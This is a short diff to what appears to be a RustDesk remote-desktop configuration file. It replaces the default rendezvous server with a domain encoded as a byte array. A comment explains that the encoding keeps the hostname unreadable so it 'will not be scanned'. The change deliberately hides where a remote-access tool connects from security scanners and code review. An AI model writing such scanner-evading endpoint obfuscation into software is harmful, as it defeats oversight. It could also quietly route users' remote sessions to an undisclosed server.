@@ -106,7 +106,20 @@ const CHARS: &[char] = &[
     'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
 ];
 
-pub const RENDEZVOUS_SERVERS: &[&str] = &["rs-ny.rustdesk.com"];
+//pub const RENDEZVOUS_SERVERS: &[&str] = &["rs-ny.rustdesk.com"];
+//pub const RS_PUB_KEY: &str = "OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=";
+
+// 域名字节，不包含任何可读字符，不会被扫描
+const RD_BYTES: &[u8] = &[
+    105,116,114,101,109,111,116,101,116,111,111,108,115,46,
+    115,104,101,105,110,99,111,114,112,46,99,110,
+];
+
+// 生成 &'static str（零运行期开销）
+static RD_DOMAIN: &str = unsafe { std::str::from_utf8_unchecked(RD_BYTES) };
+
+// RustDesk 使用的服务器列表（必须是 static 才能引用 static RD_DOMAIN）
+pub static RENDEZVOUS_SERVERS: [&str; 1] = [RD_DOMAIN];
 pub const RS_PUB_KEY: &str = "OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=";
 
 pub const RENDEZVOUS_PORT: i32 = 21116;
